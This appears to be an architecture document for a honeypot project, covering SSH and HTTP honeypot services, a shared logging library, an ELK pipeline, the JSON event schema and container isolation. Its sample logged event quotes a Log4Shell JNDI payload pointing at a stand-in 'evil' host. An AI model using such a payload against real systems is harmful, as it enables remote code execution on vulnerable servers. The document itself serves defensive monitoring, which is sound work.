# Architecture

## Components

```
┌────────────────────────────────────────────────────────────────────┐
│                       host (internet-facing)                       │
│                                                                    │
│  ┌──────────────┐   ┌──────────────┐     ┌────────────────────┐    │
│  │ ssh-honeypot │   │ http-honeypot│ ... │  (future: smb, ftp)│    │
│  │  paramiko    │   │   fastapi    │     │                    │    │
│  │  shell emu   │   │  CVE plugins │     │                    │    │
│  └───────┬──────┘   └───────┬──────┘     └──────────┬─────────┘    │
│          │                  │                       │              │
│          └──── JSON ────────┴───────────────────────┘              │
│                          │ /var/log/honeypot/*.json                │
│                          ▼                                         │
│                       filebeat                                     │
│                          │                                         │
│                       logstash ── geoip, tagging ──┐               │
│                                                    ▼               │
│                                             elasticsearch          │
│                                                    ▲               │
│                                                 kibana             │
└────────────────────────────────────────────────────────────────────┘
```

## Shared library: `honeycore`

Every service imports this. It provides:

- `get_logger(service)` — JSON logger, one event per line, keyed for Logstash.
- `Session` — attacker session dataclass, auto-generates session IDs.
- `Deception` — per-deployment randomized banners, hostnames, jitter.
- `PluginRegistry` + `CVEPlugin` — plug-and-play CVE emulation.

## Data model

One event per line of `logs/<service>/<service>.json`:

```json
{
  "ts": "2026-05-10T12:34:56.789Z",
  "service": "http",
  "deployment": "hp-prod-01",
  "session_id": "a1b2c3d4e5f6",
  "event": "cve_exploit_attempt",
  "src_ip": "198.51.100.42",
  "src_port": 51223,
  "dst_port": 8080,
  "cve": "CVE-2021-44228",
  "data": { "payloads": ["${jndi:ldap://evil/x}"], "source_fields": ["header:user-agent"] }
}
```

Indexed as `honeypot-events-YYYY.MM.DD` in Elasticsearch.

## Isolation

- Containers run as UID 1500 (non-root).
- `cap_drop: ALL` and `no-new-privileges`.
- No host-network mode; only the two honeypot ports are published.
- Recommended: deploy behind a cloud NAT / firewall that blocks all outbound
  traffic from the honeypot containers — attackers should not be able to use
  your honeypot as a pivot.
